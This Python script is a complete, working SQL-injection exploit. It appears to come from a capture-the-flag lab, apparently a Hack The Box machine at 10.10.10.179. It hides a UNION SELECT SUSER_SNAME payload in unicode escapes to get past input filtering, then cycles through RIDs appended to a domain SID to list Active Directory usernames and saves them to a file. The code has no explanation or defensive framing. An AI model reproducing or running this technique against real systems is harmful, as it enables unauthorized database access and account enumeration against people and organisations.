import re
import time
import json
import requests
import sys

# Determine the arguments presented
args = sys.argv[1:]
i = 0
delay = 0
while i < len(args):
    if args[i] == "-d" or args[i] == "--delay":
      delay = args[i+1]
      i += 1
    i += 1

def encode(SQL):
    full = ""
    for c in SQL:
        hexChar = c.encode('utf-8').hex();
        uniChar = "u00" + hexChar
        uniChar = "\\" + uniChar
        full = full + uniChar
    return full

SID = "0x0105000000000005150000001c00d1bcd181f1492bdfc236"
URL = "http://10.10.10.179/api/getColleagues"

# Build the id
for x in range(1100,3000):
    id = "0" + hex(x)[2:]
    id = id[2:] + id[:2] + 4 * "0"
    RID = SID + id
    SQL = "zz' UNION ALL SELECT 87,87,87,87,SUSER_SNAME(" + RID + ") -- Ghtb"
    PAYLOAD = encode(SQL)
#    print(PAYLOAD)
    EXPLOIT = "{\"name\":\"" + PAYLOAD + "\"}"
    time.sleep(int(delay))
    print("Checking " + RID)
    r = requests.post(URL, data = EXPLOIT, headers = {"Content-Type": "application / json; charset = utf-8"},verify=False)
    #print (r.text)
    data = json.loads(r.text)
    if len(data[0]["src"]) > 1:
        print(data[0]["src"])
        f = open('users.lst','a')
        f.write(data[0]["src"] + '\n')
        f.close()
    else:
        print("No user")
